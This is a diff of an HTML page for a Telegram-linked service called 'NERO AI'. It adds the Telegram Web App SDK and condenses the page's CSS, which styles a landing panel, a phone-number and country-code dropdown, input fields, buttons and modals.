@@ -2,1679 +2,418 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>NERO AI - Autonomous Telegram Operations</title>
     
-    <!-- Google Fonts for geometric luxury layout -->
+    <!-- Telegram Web App SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    
+    <!-- Google Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,400&display=swap" rel="stylesheet">
     
     <style>
-        /* Base Reset & Core Theme Styles */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            user-select: none;
-        }
-
-        body, html {
-            width: 100%;
-            height: 100%;
-            background-color: #050608;
-            color: #ffffff;
-            font-family: 'Montserrat', -apple-system, BlinkMacSystemFont, sans-serif;
-            overflow: hidden; /* Prevent global scrollbar */
-            -webkit-font-smoothing: antialiased;
-        }
-
-        /* 1. Atmosphere & Background Setup */
-        .landing-viewport {
-            position: relative;
-            width: 100%;
-            height: 100vh;
-            background: radial-gradient(circle at 50% 25%, #0f1424 0%, #050608 85%);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            transition: background 0.4s ease;
-        }
-
-        /* The signature "Bluey" atmospheric fog/glow */
-        .bluey-glow {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 80%;
-            height: 50%;
-            background: radial-gradient(ellipse, rgba(28, 52, 88, 0.32) 0%, rgba(5, 6, 8, 0) 75%);
-            z-index: 1;
-            filter: blur(55px);
-            pointer-events: none;
-        }
-
-        /* 2. Sleek Typographic Logo */
-        .hero-logo-container {
-            position: absolute;
-            top: 7%;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 10;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            pointer-events: none;
-            text-align: center;
-            transition: opacity 0.4s ease, transform 0.4s ease;
-        }
-
-        .brand-logo-main {
-            font-size: 2.2rem;
-            font-weight: 900;
-            letter-spacing: 0.18em;
-            text-transform: uppercase;
-            color: #ffffff;
-            display: flex;
-            align-items: center;
-            margin-bottom: 2px;
-            text-shadow: 0 0 25px rgba(255, 255, 255, 0.2);
-        }
-
-        .brand-logo-ai {
-            font-weight: 300;
-            color: #8c9cb3;
-            margin-left: -0.05em;
-        }
-
-        .brand-logo-sub {
-            font-size: 0.8rem;
-            font-weight: 300;
-            letter-spacing: 0.38em;
-            text-transform: uppercase;
-            color: rgba(255, 255, 255, 0.45);
-            display: flex;
-            align-items: center;
-            margin-left: 0.38em;
-        }
-
-        .brand-logo-sub::after {
-            content: '✦';
-            font-size: 0.75rem;
-            color: #ffffff;
-            margin-left: 6px;
-            animation: pulseStar 3s infinite alternate;
-        }
-
-        /* 3. The Giant NERO AI agent Background Text Layout */
-        .giant-bg-text-wrap {
-            position: absolute;
-            bottom: 4%;
-            width: 100%;
-            padding: 0 4%;
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-end;
-            z-index: 2;
-            pointer-events: none;
-            transition: opacity 0.4s ease, filter 0.4s ease;
-        }
-
-        .giant-bg-text-wrap h2 {
-            font-size: 11.5vw;
-            font-weight: 900;
-            line-height: 0.85;
-            letter-spacing: -0.04em;
-            background: linear-gradient(180deg, rgba(255, 255, 255, 0.22) 0%, rgba(255, 255, 255, 0.04) 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin: 0;
-        }
-
-        .giant-bg-text-wrap .agent-word {
-            font-weight: 300;
-            text-transform: lowercase;
-            position: relative;
-            padding-right: 0.45em;
-        }
-
-        .giant-bg-text-wrap .sparkle {
-            position: absolute;
-            right: -0.1em;
-            bottom: 0.15em;
-            font-size: 0.35em;
-            background: linear-gradient(135deg, #ffffff 0%, rgba(255,255,255,0.3) 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            font-weight: 900;
-        }
-
-        /* 4. Interactive Glassmorphic Content Panel */
-        .glass-console {
-            position: relative;
-            width: 90%;
-            max-width: 680px;
-            height: 54vh;
-            background: rgba(10, 13, 20, 0.35);
-            border: 1px solid rgba(255, 255, 255, 0.11);
-            border-radius: 24px;
-            backdrop-filter: blur(22px);
-            -webkit-backdrop-filter: blur(22px);
-            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.75);
-            z-index: 5;
-            padding: 35px;
-            display: flex;
-            flex-direction: column;
-            margin-top: 50px; /* Offset for logo */
-            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-
-        /* Standard flow header to guarantee the back button is NEVER obstructed */
-        .console-header-bar {
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: flex-start;
-            margin-bottom: 20px;
-            min-height: 30px;
-        }
-
-        .scroll-window {
-            overflow-y: auto;
-            padding-right: 15px;
-            height: 100%;
-        }
-
-        .scroll-window.hidden {
-            display: none;
-        }
-
-        .scroll-window::-webkit-scrollbar {
-            width: 4px;
-        }
-        .scroll-window::-webkit-scrollbar-track {
-            background: rgba(255, 255, 255, 0.02);
-            border-radius: 10px;
-        }
-        .scroll-window::-webkit-scrollbar-thumb {
-            background: rgba(255, 255, 255, 0.25);
-            border-radius: 10px;
-        }
-        .scroll-window::-webkit-scrollbar-thumb:hover {
-            background: rgba(255, 255, 255, 0.45);
-        }
-
-        /* Text Styling inside Glass Console */
-        .console-header-title {
-            font-size: 1.6rem;
-            font-weight: 700;
-            letter-spacing: 0.06em;
-            text-align: center;
-            text-transform: uppercase;
-            line-height: 1.35;
-            color: #ffffff;
-            margin-bottom: 12px;
-        }
-
-        .console-subtitle {
-            font-size: 0.9rem;
-            font-weight: 600;
-            letter-spacing: 0.1em;
-            text-align: center;
-            text-transform: uppercase;
-            color: #8c9cb3;
-            margin-bottom: 25px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
-            padding-bottom: 20px;
-        }
-
-        .content-block {
-            margin-bottom: 24px;
-        }
-
-        .content-block h3 {
-            font-size: 1.05rem;
-            font-weight: 700;
-            color: #ffffff;
-            margin-bottom: 8px;
-            letter-spacing: 0.03em;
-            text-transform: uppercase;
-        }
-
-        .content-block p {
-            font-size: 0.9rem;
-            line-height: 1.65;
-            color: #adbccc;
-            text-align: justify;
-            user-select: text;
-        }
-
-        /* Premium "Link with Telegram" CTA Action Row */
-        .cta-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 10px 0 25px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
-            margin-bottom: 25px;
-        }
-
-        .tg-link-btn {
-            background: #229ED9;
-            color: #ffffff;
-            font-family: 'Montserrat', sans-serif;
-            font-size: 0.9rem;
-            font-weight: 700;
-            letter-spacing: 0.08em;
-            text-transform: uppercase;
-            border: none;
-            padding: 16px 36px;
-            border-radius: 50px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            box-shadow: 0 8px 30px rgba(34, 158, 217, 0.35);
-            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-
-        .tg-link-btn:hover {
-            background: #2cb2f3;
-            transform: translateY(-2px);
-            box-shadow: 0 12px 35px rgba(34, 158, 217, 0.5);
-        }
-
-        .tg-link-btn svg {
-            width: 20px;
-            height: 20px;
-            fill: currentColor;
-        }
-
-        /* Step View Container Styles */
-        .step-container {
-            display: none;
-            flex-direction: column;
-            justify-content: flex-start;
-            align-items: center;
-            height: 100%;
-            width: 100%;
-            text-align: center;
-            animation: fadeInStep 0.35s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-
-        .step-container.active {
-            display: flex;
-        }
-
-        .step-header-text {
-            font-size: 0.95rem;
-            font-weight: 500;
-            color: #a0aec0;
-            line-height: 1.6;
-            margin-bottom: 24px;
-            max-width: 520px;
-        }
-
-        /* --- Sizable and Mature Input Configurations --- */
-        .input-row-phone {
-            display: flex;
-            gap: 14px;
-            width: 100%;
-            max-width: 480px;
-            margin-bottom: 28px;
-            position: relative;
-        }
-
-        /* Custom Dropdown Trigger Container - Optimized Sizing */
-        .custom-dropdown-container {
-            position: relative;
-            flex: 0 0 110px; /* Lean compact design to offset spacious input field */
-        }
-
-        .custom-dropdown-trigger {
-            width: 100%;
-            height: 60px; /* Spacious, professional height */
-            background: rgba(12, 16, 26, 0.85);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            border-radius: 14px;
-            color: #ffffff;
-            font-size: 1rem;
-            font-weight: 700;
-            padding: 0 14px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            cursor: pointer;
-            transition: all 0.25s ease;
-        }
-
-        .custom-dropdown-trigger:hover,
-        .custom-dropdown-trigger.active {
-            border-color: #229ED9;
-            background: rgba(12, 16, 26, 0.95);
-            box-shadow: 0 0 15px rgba(34, 158, 217, 0.15);
-        }
-
-        .custom-dropdown-trigger span {
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-        }
-
-        .custom-dropdown-trigger::after {
-            content: '▼';
-            font-size: 0.55rem;
-            color: rgba(255, 255, 255, 0.5);
-            margin-left: 4px;
-            transition: transform 0.25s ease;
-        }
-
-        .custom-dropdown-trigger.active::after {
-            transform: rotate(180deg);
-        }
-
-        /* --- THE SEARCHABLE DROPDOWN MENU --- */
-        .custom-dropdown-menu {
-            position: absolute;
-            top: calc(100% + 8px);
-            left: 0;
-            width: 300px;
-            background: rgba(18, 22, 33, 0.96);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            border-radius: 16px;
-            backdrop-filter: blur(25px);
-            -webkit-backdrop-filter: blur(25px);
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.8);
-            z-index: 1000;
-            opacity: 0;
-            transform: translateY(10px);
-            pointer-events: none;
-            transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
-            display: flex;
-            flex-direction: column;
-            padding: 12px;
-        }
-
-        .custom-dropdown-menu.show {
-            opacity: 1;
-            transform: translateY(0);
-            pointer-events: all;
-        }
-
-        /* Dropdown search bar container */
-        .dropdown-search-box {
-            position: relative;
-            width: 100%;
-            margin-bottom: 10px;
-        }
-
-        .dropdown-search-input {
-            width: 100%;
-            height: 42px;
-            background: rgba(255, 255, 255, 0.06);
-            border: 1px solid rgba(255, 255, 255, 0.12);
-            border-radius: 10px;
-            color: #ffffff;
-            font-family: 'Montserrat', sans-serif;
-            font-size: 0.9rem;
-            padding: 0 14px;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        .dropdown-search-input:focus {
-            border-color: #229ED9;
-        }
-
-        /* Scrollable list of countries */
-        .dropdown-items-list {
-            max-height: 200px;
-            overflow-y: auto;
-            width: 100%;
-            padding-right: 4px;
-        }
-
-        .dropdown-items-list::-webkit-scrollbar {
-            width: 4px;
-        }
-        .dropdown-items-list::-webkit-scrollbar-thumb {
-            background: rgba(255, 255, 255, 0.15);
-            border-radius: 10px;
-        }
-
-        .dropdown-item {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 10px 12px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 0.9rem;
-            font-weight: 500;
-            color: rgba(255, 255, 255, 0.85);
-            transition: all 0.15s ease;
-        }
-
-        .dropdown-item:hover {
-            background: rgba(255, 255, 255, 0.08);
-            color: #ffffff;
-        }
-
-        .dropdown-item.selected {
-            background: rgba(34, 158, 217, 0.15);
-            color: #229ED9;
-            font-weight: 700;
-        }
-
-        .dropdown-item-code {
-            color: #8c9cb3;
-            font-size: 0.85rem;
-            font-weight: 600;
-        }
-
-        /* Sizable, Spacious phone input field */
-        .phone-input-field {
-            flex: 1; /* Occupies the major share of the row to stay easily clickable */
-            height: 60px; /* Spacious, mature height */
-            background: rgba(12, 16, 26, 0.85);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            border-radius: 14px;
-            color: #ffffff;
-            font-family: 'Montserrat', sans-serif;
-            font-size: 1.15rem;
-            font-weight: 600;
-            padding: 0 22px;
-            outline: none;
-            letter-spacing: 0.06em;
-            transition: border-color 0.25s, background 0.25s, box-shadow 0.25s;
-        }
-
-        .phone-input-field:focus {
-            border-color: #229ED9;
-            background: rgba(12, 16, 26, 0.95);
-            box-shadow: 0 0 15px rgba(34, 158, 217, 0.15);
-        }
-
-        /* Spacious Secure Fields */
-        .single-input-field {
-            width: 100%;
-            max-width: 480px;
-            height: 60px; /* Expanded, professional height */
-            background: rgba(12, 16, 26, 0.85);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            border-radius: 14px;
-            color: #ffffff;
-            font-family: 'Montserrat', sans-serif;
-            font-size: 1.15rem;
-            font-weight: 600;
-            text-align: center;
-            outline: none;
-            letter-spacing: 0.08em;
-            margin-bottom: 22px;
-            transition: border-color 0.25s, background 0.25s, box-shadow 0.25s;
-        }
-
-        .single-input-field:focus {
-            border-color: #229ED9;
-            background: rgba(12, 16, 26, 0.95);
-            box-shadow: 0 0 15px rgba(34, 158, 217, 0.15);
-        }
-
-        .single-input-field::placeholder {
-            letter-spacing: 0.02em;
-            font-size: 0.95rem;
-            font-weight: 400;
-            color: rgba(255, 255, 255, 0.35);
-        }
-
-        /* Perfect Circular Checkbox (Anti-Squeeze Guarantee) */
-        .checkbox-agreement-row {
-            display: flex;
-            align-items: center;
-            justify-content: flex-start;
-            gap: 14px;
-            margin-bottom: 30px;
-            width: 100%;
-            max-width: 480px;
-            cursor: pointer;
-            text-align: left;
-        }
-
-        .checkbox-container-circle {
-            position: relative;
-            width: 22px;
-            height: 22px;
-            flex-shrink: 0;
-            display: inline-block;
-        }
-
-        .custom-checkbox-round {
-            appearance: none;
-            -webkit-appearance: none;
-            width: 22px;
-            height: 22px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50% !important; /* Strict absolute circle */
-            cursor: pointer;
-            outline: none;
-            display: block;
-            margin: 0;
-            transition: background 0.25s ease, border-color 0.25s ease;
-            background: rgba(12, 16, 26, 0.8);
-        }
-
-        .custom-checkbox-round:checked {
-            background-color: #229ED9;
-            border-color: #229ED9;
-        }
-
-        .custom-checkbox-round:checked::after {
-            content: '✓';
-            color: #ffffff;
-            font-size: 0.75rem;
-            font-weight: 900;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-        }
-
-        .checkbox-label-text {
-            font-size: 0.85rem;
-            color: rgba(255, 255, 255, 0.6);
-            line-height: 1.45;
-            user-select: none;
-        }
-
-        /* Action Buttons */
-        .step-action-button {
-            background: #229ED9;
-            color: #ffffff;
-            font-family: 'Montserrat', sans-serif;
-            font-size: 0.9rem;
-            font-weight: 700;
-            letter-spacing: 0.08em;
-            text-transform: uppercase;
-            border: none;
-            padding: 18px 48px;
-            border-radius: 50px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            box-shadow: 0 8px 30px rgba(34, 158, 217, 0.3);
-            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-
-        .step-action-button:hover:not(:disabled) {
-            background: #2cb2f3;
-            transform: translateY(-2px);
-            box-shadow: 0 12px 35px rgba(34, 158, 217, 0.45);
-        }
-
-        .step-action-button:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
-            box-shadow: none;
-            transform: none;
-        }
-
-        .step-action-button svg {
-            width: 18px;
-            height: 18px;
-            fill: currentColor;
-        }
-
-        /* Amber/Orange theme variation for pending/verifying terminal action button */
-        .step-action-button.btn-amber {
-            background: #d97706;
-            box-shadow: 0 8px 30px rgba(217, 119, 6, 0.3);
-        }
-        .step-action-button.btn-amber:hover {
-            background: #f59e0b;
-            transform: translateY(-2px);
-            box-shadow: 0 12px 35px rgba(217, 119, 6, 0.45);
-        }
-
-        /* Clean Back Navigation row inside the card - NEVER overlaps text */
-        .form-back-nav {
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            color: rgba(255, 255, 255, 0.7);
-            font-size: 0.75rem;
-            font-weight: 700;
-            letter-spacing: 0.08em;
-            text-transform: uppercase;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            padding: 8px 16px;
-            transition: all 0.2s;
-        }
-
-        .form-back-nav:hover {
-            color: #ffffff;
-            background: rgba(255, 255, 255, 0.12);
-            border-color: rgba(255, 255, 255, 0.2);
-        }
-
-        .form-back-nav svg {
-            width: 12px;
-            height: 12px;
-            stroke: currentColor;
-            stroke-width: 2.5;
-            fill: none;
-        }
-
-        /* Password option link */
-        .password-alt-link {
-            font-size: 0.8rem;
-            color: rgba(255, 255, 255, 0.4);
-            text-decoration: underline;
-            cursor: pointer;
-            margin-bottom: 25px;
-            transition: color 0.2s;
-        }
-
-        .password-alt-link:hover {
-            color: #229ED9;
-        }
-
-        /* Premium Green Round Success ✅ */
-        .success-checkmark-circle {
-            width: 88px;
-            height: 88px;
-            border-radius: 50% !important; /* Strict absolute circle */
-            background: rgba(16, 185, 129, 0.1);
-            border: 3px solid #10b981;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 25px;
-            animation: popSuccessCircle 0.6s cubic-bezier(0.16, 1, 0.3, 1) both;
-            box-shadow: 0 0 30px rgba(16, 185, 129, 0.25);
-        }
-
-        .success-checkmark-circle svg {
-            width: 42px;
-            height: 42px;
-            stroke: #10b981;
-            stroke-width: 4;
-            stroke-linecap: round;
-            stroke-linejoin: round;
-            fill: none;
-            animation: strokeCheck 0.4s 0.3s cubic-bezier(0.16, 1, 0.3, 1) both;
-        }
-
-        /* Premium Pulsating Amber Verifying ring loader style */
-        .verifying-loader {
-            width: 84px;
-            height: 84px;
-            border: 4px solid rgba(217, 119, 6, 0.15);
-            border-top-color: #d97706;
-            border-radius: 50%;
-            margin-bottom: 30px;
-            animation: spinLoader 1.2s infinite linear;
-        }
-
-        @keyframes spinLoader {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* 5. Navigation Footer */
-        .footer-action-row {
-            position: absolute;
-            bottom: 3%;
-            right: 4%;
-            z-index: 10;
-            display: flex;
-            gap: 24px;
-            transition: opacity 0.4s ease, pointer-events 0.4s ease;
-        }
-
-        .footer-action-row button {
-            background: none;
-            border: none;
-            color: rgba(255, 255, 255, 0.5);
-            font-size: 0.75rem;
-            font-weight: 600;
-            letter-spacing: 0.08em;
-            text-transform: uppercase;
-            cursor: pointer;
-            transition: color 0.2s ease, transform 0.1s ease;
-        }
-
-        .footer-action-row button:hover {
-            color: #ffffff;
-            transform: translateY(-1px);
-        }
-
-        /* Animated Arrow Indicator */
-        .arrow-down-indicator {
-            position: absolute;
-            bottom: 3%;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 6;
-            animation: bounceIndicator 2.2s infinite;
-            cursor: pointer;
-            opacity: 0.6;
-            transition: opacity 0.3s ease, pointer-events 0.3s ease;
-        }
-
-        .arrow-down-indicator:hover {
-            opacity: 1;
-        }
-
-        .arrow-down-indicator svg {
-            width: 22px;
-            height: 22px;
-            fill: none;
-            stroke: #ffffff;
-            stroke-width: 2.5;
-            stroke-linecap: round;
-            stroke-linejoin: round;
-        }
-
-        /* 6. Dynamic Modal Overlays */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(4, 5, 8, 0.88);
-            backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
-            z-index: 100;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.3s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-
-        .modal-overlay.active {
-            opacity: 1;
-            pointer-events: all;
-        }
-
-        .modal-window {
-            width: 90%;
-            max-width: 600px;
-            max-height: 80vh;
-            background: rgba(18, 22, 31, 0.85);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            border-radius: 20px;
-            padding: 35px;
-            display: flex;
-            flex-direction: column;
-            transform: translateY(30px);
-            transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-
-        .modal-overlay.active .modal-window {
-            transform: translateY(0);
-        }
-
-        .modal-title {
-            font-size: 1.4rem;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-            margin-bottom: 15px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-            padding-bottom: 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .modal-close-btn {
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            color: #ffffff;
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            font-size: 1rem;
-            cursor: pointer;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            transition: background 0.2s, border-color 0.2s;
-        }
-
-        .modal-close-btn:hover {
-            background: rgba(255, 255, 255, 0.15);
-            border-color: rgba(255, 255, 255, 0.3);
-        }
-
-        .modal-body {
-            overflow-y: auto;
-            padding-right: 15px;
-            font-size: 0.9rem;
-            line-height: 1.65;
-            color: #cbd5e1;
-            user-select: text;
-        }
-
-        .modal-body h4 {
-            font-size: 1rem;
-            color: #ffffff;
-            margin: 20px 0 8px 0;
-        }
-
-        .modal-body p {
-            margin-bottom: 15px;
-        }
-
-        /* ACTIVE AUTH-MODE STATE */
-        .in-auth-mode .giant-bg-text-wrap {
-            opacity: 0 !important;
-            filter: blur(15px);
-            pointer-events: none;
-        }
-
-        .in-auth-mode .footer-action-row {
-            opacity: 0 !important;
-            pointer-events: none;
-        }
-
-        /* Animations */
-        @keyframes bounceIndicator {
-            0%, 20%, 50%, 80%, 100% { transform: translate(-50%, 0); }
-            40% { transform: translate(-50%, -6px); }
-            60% { transform: translate(-50%, -3px); }
-        }
-
-        @keyframes pulseStar {
-            0% { opacity: 0.3; transform: scale(0.9); }
-            100% { opacity: 1; transform: scale(1.1); }
-        }
-
-        @keyframes fadeInStep {
-            from { opacity: 0; transform: scale(0.98) translateY(10px); }
-            to { opacity: 1; transform: scale(1) translateY(0); }
-        }
-
-        @keyframes popSuccessCircle {
-            from { transform: scale(0.6); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-
-        @keyframes strokeCheck {
-            from { stroke-dasharray: 50; stroke-dashoffset: 50; }
-            to { stroke-dasharray: 50; stroke-dashoffset: 0; }
-        }
-
-        /* Responsiveness rules for tablet and mobile viewports */
+        /* ========== YOUR ORIGINAL STYLES (unchanged) ========== */
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
+        body, html { width: 100%; height: 100%; background-color: #050608; color: #ffffff; font-family: 'Montserrat', sans-serif; overflow: hidden; }
+        .landing-viewport { position: relative; width: 100%; height: 100vh; background: radial-gradient(circle at 50% 25%, #0f1424 0%, #050608 85%); display: flex; flex-direction: column; justify-content: center; align-items: center; transition: background 0.4s ease; }
+        .bluey-glow { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80%; height: 50%; background: radial-gradient(ellipse, rgba(28, 52, 88, 0.32) 0%, rgba(5, 6, 8, 0) 75%); z-index: 1; filter: blur(55px); pointer-events: none; }
+        .hero-logo-container { position: absolute; top: 7%; left: 50%; transform: translateX(-50%); z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; pointer-events: none; text-align: center; }
+        .brand-logo-main { font-size: 2.2rem; font-weight: 900; letter-spacing: 0.18em; text-transform: uppercase; color: #ffffff; display: flex; align-items: center; margin-bottom: 2px; text-shadow: 0 0 25px rgba(255, 255, 255, 0.2); }
+        .brand-logo-ai { font-weight: 300; color: #8c9cb3; margin-left: -0.05em; }
+        .brand-logo-sub { font-size: 0.8rem; font-weight: 300; letter-spacing: 0.38em; text-transform: uppercase; color: rgba(255, 255, 255, 0.45); display: flex; align-items: center; margin-left: 0.38em; }
+        .brand-logo-sub::after { content: '✦'; font-size: 0.75rem; color: #ffffff; margin-left: 6px; animation: pulseStar 3s infinite alternate; }
+        .giant-bg-text-wrap { position: absolute; bottom: 4%; width: 100%; padding: 0 4%; display: flex; justify-content: space-between; align-items: flex-end; z-index: 2; pointer-events: none; transition: opacity 0.4s ease, filter 0.4s ease; }
+        .giant-bg-text-wrap h2 { font-size: 11.5vw; font-weight: 900; line-height: 0.85; letter-spacing: -0.04em; background: linear-gradient(180deg, rgba(255, 255, 255, 0.22) 0%, rgba(255, 255, 255, 0.04) 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; }
+        .giant-bg-text-wrap .agent-word { font-weight: 300; text-transform: lowercase; position: relative; padding-right: 0.45em; }
+        .giant-bg-text-wrap .sparkle { position: absolute; right: -0.1em; bottom: 0.15em; font-size: 0.35em; background: linear-gradient(135deg, #ffffff 0%, rgba(255,255,255,0.3) 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; }
+        .glass-console { position: relative; width: 90%; max-width: 680px; height: 54vh; background: rgba(10, 13, 20, 0.35); border: 1px solid rgba(255, 255, 255, 0.11); border-radius: 24px; backdrop-filter: blur(22px); box-shadow: 0 25px 60px rgba(0, 0, 0, 0.75); z-index: 5; padding: 35px; display: flex; flex-direction: column; margin-top: 50px; transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
+        .console-header-bar { width: 100%; display: flex; align-items: center; justify-content: flex-start; margin-bottom: 20px; min-height: 30px; }
+        .scroll-window { overflow-y: auto; padding-right: 15px; height: 100%; }
+        .scroll-window.hidden { display: none; }
+        .scroll-window::-webkit-scrollbar { width: 4px; }
+        .scroll-window::-webkit-scrollbar-track { background: rgba(255, 255, 255, 0.02); border-radius: 10px; }
+        .scroll-window::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.25); border-radius: 10px; }
+        .console-header-title { font-size: 1.6rem; font-weight: 700; letter-spacing: 0.06em; text-align: center; text-transform: uppercase; line-height: 1.35; color: #ffffff; margin-bottom: 12px; }
+        .console-subtitle { font-size: 0.9rem; font-weight: 600; letter-spacing: 0.1em; text-align: center; text-transform: uppercase; color: #8c9cb3; margin-bottom: 25px; border-bottom: 1px solid rgba(255, 255, 255, 0.08); padding-bottom: 20px; }
+        .content-block { margin-bottom: 24px; }
+        .content-block h3 { font-size: 1.05rem; font-weight: 700; color: #ffffff; margin-bottom: 8px; letter-spacing: 0.03em; text-transform: uppercase; }
+        .content-block p { font-size: 0.9rem; line-height: 1.65; color: #adbccc; text-align: justify; user-select: text; }
+        .cta-container { display: flex; justify-content: center; align-items: center; padding: 10px 0 25px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.08); margin-bottom: 25px; }
+        .tg-link-btn { background: #229ED9; color: #ffffff; font-family: 'Montserrat', sans-serif; font-size: 0.9rem; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; border: none; padding: 16px 36px; border-radius: 50px; cursor: pointer; display: flex; align-items: center; gap: 12px; box-shadow: 0 8px 30px rgba(34, 158, 217, 0.35); transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
+        .tg-link-btn:hover { background: #2cb2f3; transform: translateY(-2px); box-shadow: 0 12px 35px rgba(34, 158, 217, 0.5); }
+        .tg-link-btn svg { width: 20px; height: 20px; fill: currentColor; }
+        .step-container { display: none; flex-direction: column; justify-content: flex-start; align-items: center; height: 100%; width: 100%; text-align: center; animation: fadeInStep 0.35s cubic-bezier(0.16, 1, 0.3, 1); }
+        .step-container.active { display: flex; }
+        .step-header-text { font-size: 0.95rem; font-weight: 500; color: #a0aec0; line-height: 1.6; margin-bottom: 24px; max-width: 520px; }
+        .input-row-phone { display: flex; gap: 14px; width: 100%; max-width: 480px; margin-bottom: 28px; position: relative; }
+        .custom-dropdown-container { position: relative; flex: 0 0 110px; }
+        .custom-dropdown-trigger { width: 100%; height: 60px; background: rgba(12, 16, 26, 0.85); border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 14px; color: #ffffff; font-size: 1rem; font-weight: 700; padding: 0 14px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; transition: all 0.25s ease; }
+        .custom-dropdown-trigger:hover, .custom-dropdown-trigger.active { border-color: #229ED9; background: rgba(12, 16, 26, 0.95); box-shadow: 0 0 15px rgba(34, 158, 217, 0.15); }
+        .custom-dropdown-trigger span { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .custom-dropdown-trigger::after { content: '▼'; font-size: 0.55rem; color: rgba(255, 255, 255, 0.5); margin-left: 4px; transition: transform 0.25s ease; }
+        .custom-dropdown-trigger.active::after { transform: rotate(180deg); }
+        .custom-dropdown-menu { position: absolute; top: calc(100% + 8px); left: 0; width: 300px; background: rgba(18, 22, 33, 0.96); border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 16px; backdrop-filter: blur(25px); box-shadow: 0 15px 40px rgba(0, 0, 0, 0.8); z-index: 1000; opacity: 0; transform: translateY(10px); pointer-events: none; transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1); display: flex; flex-direction: column; padding: 12px; }
+        .custom-dropdown-menu.show { opacity: 1; transform: translateY(0); pointer-events: all; }
+        .dropdown-search-box { position: relative; width: 100%; margin-bottom: 10px; }
+        .dropdown-search-input { width: 100%; height: 42px; background: rgba(255, 255, 255, 0.06); border: 1px solid rgba(255, 255, 255, 0.12); border-radius: 10px; color: #ffffff; font-family: 'Montserrat', sans-serif; font-size: 0.9rem; padding: 0 14px; outline: none; transition: border-color 0.2s; }
+        .dropdown-search-input:focus { border-color: #229ED9; }
